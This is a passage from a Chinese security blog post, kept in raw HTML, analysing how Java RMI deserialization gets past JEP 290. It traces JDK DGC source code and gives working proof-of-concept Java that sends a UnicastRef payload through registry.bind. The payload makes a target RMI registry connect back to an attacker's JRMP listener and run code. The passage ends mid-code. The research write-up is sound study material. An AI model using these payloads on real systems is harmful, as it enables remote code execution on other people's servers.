class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sun.rmi.transport.ConnectionInputStream#registerRefs</code>:从之前readobject语句解析出来的<code>incomingRefTable</code>中读取ref。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerRefs</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.incomingRefTable.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">//遍历incomingRefTable</span></span><br><span class="line">        Iterator var1 = <span class="keyword">this</span>.incomingRefTable.entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span>(var1.hasNext()) &#123;</span><br><span class="line">            Entry var2 = (Entry)var1.next();</span><br><span class="line">            <span class="comment">//开始一个个去DGC注册</span></span><br><span class="line">            DGCClient.registerRefs((Endpoint)var2.getKey(), (List)var2.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就回到了yso里面的调用栈的下半部分：<code>sun.rmi.transport.DGCClient#registerRefs</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">registerRefs</span><span class="params">(Endpoint ep, List&lt;LiveRef&gt; refs)</span> </span>&#123;</span><br><span class="line">    EndpointEntry epEntry;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//从给定的ep中查找引用对象入口</span></span><br><span class="line">        <span class="comment">//这里就是我们调用栈下面一直跑的部分。</span></span><br><span class="line">        epEntry = EndpointEntry.lookup(ep);</span><br><span class="line">        <span class="comment">//去该入口注册引用对象，如果不成功循环注册，直到成功。</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (!epEntry.registerRefs(refs));<span class="comment">//----进入此处---</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sun.rmi.transport.DGCClient.EndpointEntry#registerRefs</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">registerRefs</span><span class="params">(List&lt;LiveRef&gt; refs)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">assert</span> !Thread.holdsLock(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">            Set&lt;RefEntry&gt; refsToDirty = <span class="keyword">null</span>;     <span class="comment">// entries for refs needing dirty</span></span><br><span class="line">            <span class="keyword">long</span> sequenceNum;           <span class="comment">// sequence number for dirty call</span></span><br><span class="line"><span class="comment">//阻塞执行，去遍历查询LiveRef实例</span></span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">                <span class="comment">//省略此处代码，就是做遍历查询的事情</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//为所有结果参与DGC垃圾回收机制注册</span></span><br><span class="line">        <span class="comment">//------进入此处------</span></span><br><span class="line">            makeDirtyCall(refsToDirty, sequenceNum);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>sun.rmi.transport.DGCClient.EndpointEntry#makeDirtyCall</code>:(这里会发出DGC客户端的dirty请求)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">makeDirtyCall</span><span class="params">(Set&lt;RefEntry&gt; refEntries, <span class="keyword">long</span> sequenceNum)</span> </span>&#123;</span><br><span class="line">           <span class="keyword">assert</span> !Thread.holdsLock(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//根据refEntries得到注册用的ids</span></span><br><span class="line">           ObjID[] ids;</span><br><span class="line">           <span class="keyword">if</span> (refEntries != <span class="keyword">null</span>) &#123;</span><br><span class="line">               ids = createObjIDArray(refEntries);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               ids = emptyObjIDArray;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="comment">//进入此处，进行dirty请求</span></span><br><span class="line">               Lease lease =</span><br><span class="line">                   dgc.dirty(ids, sequenceNum, <span class="keyword">new</span> Lease(vmid, leaseValue));</span><br></pre></td></tr></table></figure><p>由于这里是一个接口，静态分析的话，我们需要使用ctrl+alt+B，进入<code>sun.rmi.transport.DGCImpl_Stub#dirty</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Lease <span class="title">dirty</span><span class="params">(ObjID[] var1, <span class="keyword">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          RemoteCall var5 = <span class="keyword">super</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">              ObjectOutput var6 = var5.getOutputStream();</span><br><span class="line">              var6.writeObject(var1);</span><br><span class="line">              var6.writeLong(var2);</span><br><span class="line">              var6.writeObject(var4);</span><br><span class="line">          &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling arguments"</span>, var20);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//JRMP服务端打JRMP客户端的反序列化触发点在这里面</span></span><br><span class="line">          <span class="keyword">super</span>.ref.invoke(var5);</span><br></pre></td></tr></table></figure><p>这里就很熟悉了，JRMP服务端打JRMP客户端，JRMP客户端的漏洞触发点就在这。</p><p>那么也就是说<strong>UnicastRef对象的readExternal方法作为反序列化入口的话</strong>，我们可以通过控制序列化的内容使服务器向我们指定的服务器发起JRMP连接（通过DGC层的dirty方法发起），再通过之前讲到的JRMP客户端报错信息反序列化点完成RCE。</p><p>我们把之前的攻击过程调试一下看下，同样在CC链的最后命令执行处下断点：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17a0o9vlj30qw0eedhw.jpg" alt="绕过JEP290-bind调用栈.png"></p><p>调用栈,应该是由于服务端线程处理的特性（？）发生了变化，但是最后核心部分是没问题的。（UnicastRef的readExternal处作为入口下断点也是可以看到的，但是之后会跑偏，最后再到这部分）</p><blockquote><p>本地实验发现一个有趣的地方，这里会不断循环，一直请求我们恶意JRMP-Listener，从而不断完成远程代码执行的情况。原因应该是因为分析代码的时候的while循环导致的（这就是我们反序列化触发栈发生变动的原因。），非常有趣，仿佛一个天然发心跳包的木马一样。</p></blockquote><p>知道服务端反序列化处的触发流程之后，我们来看payload的构造。</p><p>一个基础的可以指定连接目标的UnicastRef对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//让受害者主动去连接的攻击者的JRMPlister的host和port</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> UnicastRef <span class="title">generateUnicastRef</span><span class="params">(String host, <span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line">    java.rmi.server.ObjID objId = <span class="keyword">new</span> java.rmi.server.ObjID();</span><br><span class="line">    sun.rmi.transport.tcp.TCPEndpoint endpoint = <span class="keyword">new</span> sun.rmi.transport.tcp.TCPEndpoint(host, port);</span><br><span class="line">    sun.rmi.transport.LiveRef liveRef = <span class="keyword">new</span> sun.rmi.transport.LiveRef(objId, endpoint, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> sun.rmi.server.UnicastRef(liveRef);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果这个对象在目标服务器反序列化成功了，就可以顺着之前分析的反序列化过程向外发起连接。<strong>但是如何让这个对象反序列化呢？</strong>还需要进一步的封装。</p><h4 id="与bind操作进行拼接"><a href="#与bind操作进行拼接" class="headerlink" title="与bind操作进行拼接"></a>与bind操作进行拼接</h4><p>我们的目标是：将UnicastRef对象封装进入<code>register.bind(String,Remote)</code>的Remote参数中，从而在反序列化Remote参数的时候因为反序列化的递归的特性，进行UnicastRef对象的反序列化。那又回归到了前面讨论过的问题，如何将UnicastRef对象封装成Remote类型：</p><ol><li><p>压根不封装，跟Barmie工具一样自实现通讯协议，直接发送UnicastRef（因为其实只有客户端上层函数需要remote类型的输入，服务端并没有要求是remote类型，都会反序列化）</p></li><li><p>跟RMIRegisterExploit一样，使用<strong>动态代理</strong>来实现封装</p><p>回一下动态代理封装的原理：将我们的payload放在拦截器的类参数中，然后封装拦截器成Remote类型，反序列化的时候就会反序列化拦截器里面的payload的参数，从而形成反序列化。</p><p>但是跟之前不同的是：没有白名单的时候我们可以用到AnnotationInvocationHandler装载UnicastRef对象，再把它动态代理变成Remote对象。</p><p>但是在JEP290之后有了白名单限制，AnnotationInvocationHandler对象被禁了。</p><p>我们需要用到</p></li><li><p>找一个同时继承实现两者的类或者一个实现Remote，并将UnicastRef类型作为其一个字段的类。这样只需要把我们的UnicastRef对象塞入这个类中，然后直接塞进<code>register.bind(String,Remote)</code>中就可以了。</p></li></ol><h5 id="1-绕过客户端-自实现协议"><a href="#1-绕过客户端-自实现协议" class="headerlink" title="1.绕过客户端-自实现协议"></a>1.绕过客户端-自实现协议</h5><p>第一类实现bind底层协议，太过底层，感觉可以根据Barmie改，但是有点磕不动，放放。</p><blockquote><p>但是在最后我们还是以两种方式自实现了lookup的协议。</p></blockquote><h5 id="2-动态代理-自定义"><a href="#2-动态代理-自定义" class="headerlink" title="2.动态代理-自定义"></a>2.动态代理-自定义</h5><p>代码参考github-Bypass290_proxy.java</p><p>我们自定义一个PocHandler拦截器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PocHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> RemoteRef ref;<span class="comment">//来放我们的UnicastRef对象</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">PocHandler</span><span class="params">(RemoteRef newref)</span> </span>&#123;<span class="comment">//构造方法，来引入UnicastRef</span></span><br><span class="line">        ref = newref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.ref <span class="comment">//只是为了满足拦截类的格式，随便写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把生成UnicastRef放入PocHandler拦截器，然后转变为Remote类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    String jrmpListenerHost = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">int</span> jrmpListenerPort = <span class="number">1199</span>;</span><br><span class="line">    UnicastRef unicastRef = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);</span><br><span class="line">    Remote remote = (Remote) Proxy.newProxyInstance(RemoteRef.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Remote.class&#125;, <span class="keyword">new</span> PocHandler(unicastRef));</span><br><span class="line">    Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);<span class="comment">//本地测试</span></span><br><span class="line">    registry.bind(<span class="string">"2333"</span>, remote);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老样子JRMP-listener一开，然后打ServerAndRegister</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17an3i2aj325h175kc6.jpg" alt="绕过JEP-Bypass_proxy.png"></p><p>完美，没问题</p><blockquote><p>同时这里存在一个非常神奇的问题，本以为客户端自定义一个PocHandler拦截器，rmi服务端是不会有这个拦截器的，所以在反序列化的时候会因为没有类而报错。但是实际上远程利用是可以成功的。</p><p>从报错中我们也可以看到，服务端确实找不到这个类，但是会触发代码执行，之前bind绑定也说过这个问题，推测由于先反序列化类中的变量，然后恢复成类导致的。</p></blockquote><h5 id="2-动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）"><a href="#2-动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）" class="headerlink" title="2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）"></a>2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）</h5><blockquote><p>这其实就是Ysoserial-Payload-JRMPClient模块生成的payload的实现逻辑</p></blockquote><p>假如不自定义一个拦截器，去jdk环境中寻找也是可以找到的——<strong>RemoteObjectInvocationHandler</strong></p><ol><li>它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li><li>同时是一个 拦截器。（这表示我们可以通过动态代理把他改成任意的接口）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteObjectInvocationHandler</span></span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">RemoteObject</span></span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">InvocationHandler</span> //表示是一个拦截器</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数，传入一个RemoteRef接口类型的变量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RemoteObjectInvocationHandler</span><span class="params">(RemoteRef ref)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(ref);</span><br><span class="line">        <span class="keyword">if</span> (ref == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//而UnicastRef类型实现RemoteRef接口，即可以传入</span></span><br><span class="line"><span class="comment">//public class UnicastRef implements RemoteRef &#123;</span></span><br></pre></td></tr></table></figure><p><code>super(ref);</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteObject</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The object's remote reference. */</span></span><br><span class="line">    <span class="keyword">transient</span> <span class="keyword">protected</span> RemoteRef ref;</span><br><span class="line">    </span><br><span class="line"> <span class="comment">//super(ref)的内容，可以成功塞入变量中</span></span><br><span class="line">     <span class="function"><span class="keyword">protected</span> <span class="title">RemoteObject</span><span class="params">(RemoteRef newref)</span> </span>&#123;</span><br><span class="line">        ref = newref;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然而这里会有一个神奇的问题，我们知道<code>transient</code>修饰的变量在正常的序列化过程中是不会被序列化的（会为空）。那我们特制的ref不就因为无论怎么样都不序列化了？</p><p>但理论的确如此，但实际不是的，因为我们还知道如果这个类对于writeobject、readobject进行了重写，就会进入这个方法进行特殊的逻辑执行。</p><p><code>java.rmi.server.RemoteObject#writeObject</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (ref == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.MarshalException(<span class="string">"Invalid remote object"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String refClassName = ref.getRefClass(out);</span><br><span class="line">            <span class="keyword">if</span> (refClassName == <span class="keyword">null</span> || refClassName.length() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//不会进入的地方....</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Built-in reference class specified, so delegate</span></span><br><span class="line"><span class="comment">                 * to reference to write out its external form.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                 <span class="comment">//我们的序列化操作会进入到这里对于ref进行序列化</span></span><br><span class="line">                out.writeUTF(refClassName);</span><br><span class="line">                ref.writeExternal(out);</span><br><span class="line">                <span class="comment">//在这里通过writeExternal来写入了ref</span></span><br><span class="line">                <span class="comment">//（transient类型的变量可以通过writeExternal来写入序列化）</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在Remoteobject的writeobject方法中可以完成对于同时，我们也可以通过把序列化结果写入文件看序列化结果来证明ref的序列化不会受到影响。</p><p>那么在确定<strong>RemoteObjectInvocationHandler</strong>可以填入一个<strong>UnicastRef对象</strong>并且不影响序列化之后。接下来就是利用动态代理进行类型转变</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bypass290</span> </span>&#123;</span><br><span class="line">    <span class="comment">//省略generateUnicastRef方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//获取UnicastRef对象</span></span><br><span class="line">        String jrmpListenerHost = <span class="string">"127.0.0.1"</span>;<span class="comment">//本地测试</span></span><br><span class="line">        <span class="keyword">int</span> jrmpListenerPort = <span class="number">1199</span>;</span><br><span class="line">        UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);</span><br><span class="line">        <span class="comment">//通过构造函数封装进入RemoteObjectInvocationHandler</span></span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        <span class="comment">//使用动态代理改变obj的类型变为Registry，这是Remote类型的子类</span></span><br><span class="line">        <span class="comment">//所以接下来bind可以填入proxy</span></span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(Bypass290.class.getClassLoader(),</span><br><span class="line">                                                           <span class="keyword">new</span> Class[]&#123;Registry.class&#125;, obj);</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);<span class="comment">//本地测试</span></span><br><span class="line">        registry.bind(<span class="string">"hello"</span>, proxy);<span class="comment">//填入payload</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17askso1j320p12in1p.jpg" alt="绕过JEP-Bypass290-RemoteObjectInvocationHandler.png"></p><h5 id="3-找一个带UnicastRef类型参数的实现Remote接口的类"><a href="#3-找一个带UnicastRef类型参数的实现Remote接口的类" class="headerlink" title="3.找一个带UnicastRef类型参数的实现Remote接口的类"></a>3.找一个带UnicastRef类型参数的实现Remote接口的类</h5><p>那么第三种情况，直接不用动态代理构造去弄成Remote接口，直接找一个实现Remote接口的类。</p><ol><li>这个类它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li><li>这个类要是Remote接口的</li></ol><h6 id="RemoteObjectInvocationHandler"><a href="#RemoteObjectInvocationHandler" class="headerlink" title="RemoteObjectInvocationHandler"></a>RemoteObjectInvocationHandler</h6><p>其实<strong>RemoteObjectInvocationHandler</strong>本身就是一个实现了Remote接口的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RemoteObjectInvocationHandler定义，继承自RemoteObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteObjectInvocationHandler</span></span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">RemoteObject</span></span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">//<span class="title">RemoteObject</span>定义，实现了<span class="title">Remote</span>接口</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">abstract</span> <span class="title">class</span> <span class="title">RemoteObject</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>所以上面<strong>ysoserial-payload-JRMPClient</strong>中利用动态代理修改RemoteObjectInvocationHandler接口是多余的。</p><p>直接注释了动态代理操作也可以打。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//获取UnicastRef对象</span></span><br><span class="line">    String jrmpListenerHost = <span class="string">"127.0.0.1"</span>;<span class="comment">//本地测试</span></span><br><span class="line">    <span class="keyword">int</span> jrmpListenerPort = <span class="number">1199</span>;</span><br><span class="line">    UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);</span><br><span class="line">    <span class="comment">//通过构造函数封装进入RemoteObjectInvocationHandler</span></span><br><span class="line">    RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">    <span class="comment">//使用动态代理改变obj的类型变为Registry，这是Remote类型的子类</span></span><br><span class="line">    <span class="comment">//所以接下来bind可以填入proxy 注释</span></span><br><span class="line">    <span class="comment">//        Registry proxy = (Registry) Proxy.newProxyInstance(Bypass290.class.getClassLoader(),</span></span><br><span class="line">    <span class="comment">//                new Class[]&#123;Registry.class&#125;, obj);</span></span><br><span class="line">    <span class="comment">//触发漏洞</span></span><br><span class="line">    Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);<span class="comment">//本地测试</span></span><br><span class="line">    <span class="comment">//        registry.bind("hello", proxy);//填入payload</span></span><br><span class="line">    registry.bind(<span class="string">"hello"</span>, obj);<span class="comment">//填入payload</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17b0fw5qj323u11igzp.jpg" alt="绕过JEP-bYPASS290-RemoteObject-参数.png"></p><p>可以发现我们的RemoteObjectInvocationHandler继承自RemoteObject。</p><ol><li>而UnicastRef对象是在RemoteObject类中赋值的</li><li>RemoteObject类又是一个Remote接口</li></ol><p>那么理论上来说所有RemoteObject的子类都是可以的，我们可以通过ctrl+alt+B来查看子类。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17b654atj31i00l30wb.jpg" alt="绕过JEP-remote参数更多查看方式.png"></p><p>我们选取<strong>RMIConnectionImpl_Stub</strong>和<strong>UnicastRemoteObject</strong>来举例说明</p><h6 id="RMIConnectionImpl-Stub"><a href="#RMIConnectionImpl-Stub" class="headerlink" title="RMIConnectionImpl_Stub"></a>RMIConnectionImpl_Stub</h6><p>RMIConnectionImpl_Stub是可以利用的。</p><p>是Remote接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RMIConnectionImpl_Stub类定义，继承自RemoteStub类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIConnectionImpl_Stub</span></span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">server</span>.<span class="title">RemoteStub</span></span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">javax</span>.<span class="title">management</span>.<span class="title">remote</span>.<span class="title">rmi</span>.<span class="title">RMIConnection</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java.rmi.server.RemoteStub 定义，继承自RemoteObject类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteStub</span> <span class="keyword">extends</span> <span class="title">RemoteObject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//RemoteObject定义，实现Remote接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteObject</span> <span class="keyword">implements</span> <span 